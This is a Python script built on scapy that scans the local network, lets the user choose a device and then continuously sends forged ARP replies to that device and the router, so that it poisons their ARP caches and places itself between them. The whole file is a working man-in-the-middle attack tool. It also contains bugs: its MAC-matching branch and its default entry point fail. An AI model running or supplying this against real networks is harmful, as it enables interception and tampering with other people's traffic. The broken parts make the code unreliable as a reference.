import scapy.all as scapy
import psutil
import ipaddress


def get_local_network():
    """Automatically retrieves the local network range based on the active interface"""
    interfaces = psutil.net_if_addrs()
    for iface_name, iface_info in interfaces.items():
        for addr in iface_info:
            if addr.family == 2:  # IPv4
                ip = addr.address
                netmask = addr.netmask
                if ip != "127.0.0.1":  # Skip localhost
                    network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                    return str(network)
    raise ValueError("No active network interface found")

def scan(ip_range):
    """Scans the network in the given IP range and returns a list of devices"""
    print(f"[INFO] Scanning network: {ip_range}")
    request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answered = scapy.srp(packet, timeout=5, verbose=False)[0]

    devices = []
    for element in answered:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
    return devices

def restore_defaults(dest, source):
    """Restores default ARP settings"""
    target_mac = get_mac(dest)
    source_mac = get_mac(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

def get_mac(ip):
    """Returns the MAC address for a given IP"""
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answer = scapy.srp(packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoofing(target, spoofed):
    """Sends a spoofed ARP packet"""
    mac = get_mac(target)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    scapy.send(packet, verbose=False)

def display_menu(devices):
    """Displays a menu with a list of devices and allows the user to select a target"""
    print("\nAvailable devices on the network:")
    for i, device in enumerate(devices):
        print(f"{i + 1}. IP: {device['ip']}, MAC: {device['mac']}")
    print("0. Exit")

    choice = int(input("\nSelect a device (number): "))
    if choice == 0:
        return
    elif 1 <= choice <= len(devices):
        return devices[choice - 1]
    else:
        print("Invalid choice. Please try again.")
        return display_menu(devices)



def start_arp_poisoning(mac_address):
    try:
        # Automatyczne wykrywanie zakresu sieci
        target_device = None
        network_range = get_local_network()
        devices = scan(network_range)

        if not devices:
            print("No devices found on the network.")
            exit(0)

        # Display menu and select a target device
        if mac_address is None:
            target_device = display_menu(devices)
        else:
            for device in enumerate(devices):
                if device['mac'] == mac_address:
                    target_device = device

        if target_device is None:
            return

        # Enter the router's IP (default gateway)
        router_ip = input("Enter the router's IP: ")

        print(f"Starting spoofing: {target_device['ip']} <- {router_ip}")
        try:
            while True:
                spoofing(target_device["ip"], router_ip)
                spoofing(router_ip, target_device["ip"])
        except KeyboardInterrupt:
            print("\n[!] Process interrupted. Restoring default ARP settings...")
            restore_defaults(target_device["ip"], router_ip)
            restore_defaults(router_ip, target_device["ip"])
            print("Default settings restored. Exiting.")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    start_arp_poisoning("")

